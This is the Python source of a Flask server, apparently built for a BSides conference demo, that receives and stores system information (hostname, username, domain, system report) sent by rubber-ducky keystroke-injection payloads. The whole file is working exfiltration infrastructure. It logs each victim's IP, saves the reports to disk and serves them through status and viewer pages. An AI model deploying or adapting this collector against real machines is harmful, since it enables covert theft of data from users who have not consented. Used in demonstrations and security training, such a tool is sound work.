#!/usr/bin/env python3
"""
BSIDEs Demo - Data Collection Server
Receives system information from rubber ducky payloads
"""

from flask import Flask, request, jsonify
import datetime
import os
import json
import html

app = Flask(__name__)

# Create data directory
if not os.path.exists('collected_data'):
    os.makedirs('collected_data')

@app.route('/collect', methods=['POST'])
def collect_data():
    """Receive and store system information"""
    try:
        # Get client IP
        client_ip = request.remote_addr
        if request.headers.get('X-Forwarded-For'):
            client_ip = request.headers.get('X-Forwarded-For').split(',')[0]
        
        # Get timestamp
        timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Extract data from POST request
        hostname = request.form.get('hostname', 'unknown')
        username = request.form.get('username', 'unknown') 
        domain = request.form.get('domain', 'unknown')
        data = request.form.get('data', 'No data received')
        
        # Create filename
        filename = f"sysinfo_{hostname}_{username}_{timestamp}.txt"
        filepath = os.path.join('collected_data', filename)
        
        # Create report with metadata
        report = f"""=== COLLECTION METADATA ===
Collection Time: {datetime.datetime.now()}
Source IP: {client_ip}
User Agent: {request.headers.get('User-Agent', 'Unknown')}
Hostname: {hostname}
Username: {username}
Domain: {domain}

=== SYSTEM REPORT ===
{data}
"""
        
        # Save to file
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(report)
        
        # Log the collection
        print(f"[{timestamp}] Data collected from {client_ip} - {hostname}\\{username}")
        print(f"[{timestamp}] Saved to: {filename}")
        
        # Return success response
        return jsonify({
            'status': 'success',
            'message': 'Data received and stored',
            'filename': filename,
            'timestamp': timestamp
        }), 200
        
    except Exception as e:
        print(f"Error processing request: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': 'Failed to process data'
        }), 500

@app.route('/status', methods=['GET'])
def status():
    """Check server status and show collected files"""
    try:
        files = os.listdir('collected_data')
        files.sort(reverse=True)  # Most recent first
        
        return jsonify({
            'status': 'online',
            'collected_files': len(files),
            'recent_files': files[:10]  # Show last 10 files
        })
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/view/<filename>', methods=['GET'])
def view_file(filename):
    """View a collected file (for demo purposes)"""
    try:
        # Security: only allow files in collected_data directory
        if '..' in filename or '/' in filename:
            return "Invalid filename", 400
            
        filepath = os.path.join('collected_data', filename)
        if not os.path.exists(filepath):
            return "File not found", 404
            
        with open(filepath, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Return as HTML for easy viewing
        html_content = f"""
        <html>
        <head><title>System Report: {html.escape(filename)}</title></head>
        <body>
        <h1>System Report: {html.escape(filename)}</h1>
        <pre style="background-color: #f5f5f5; padding: 10px; overflow: auto;">
{html.escape(content)}
        </pre>
        <a href="/status">Back to Status</a>
        </body>
        </html>
        """
        return html_content
        
    except Exception as e:
        return f"Error reading file: {str(e)}", 500

@app.route('/', methods=['GET'])
def index():
    """Simple index page"""
    return """
    <html>
    <head><title>BSIDEs Data Collection Server</title></head>
    <body>
    <h1>BSIDEs Demo - Data Collection Server</h1>
    <p>Server is running and ready to collect data.</p>
    <ul>
    <li><a href="/status">View Status & Files</a></li>
    <li><strong>Collection Endpoint:</strong> POST /collect</li>
    </ul>
    </body>
    </html>
    """

if __name__ == '__main__':
    print("=== BSIDEs Data Collection Server ===")
    print("Starting server on http://0.0.0.0:8080")
    print("Collection endpoint: http://your-server.com:8080/collect")
    print("Status page: http://your-server.com:8080/status")
    print("Press Ctrl+C to stop")
    
    app.run(host='0.0.0.0', port=8080, debug=False)
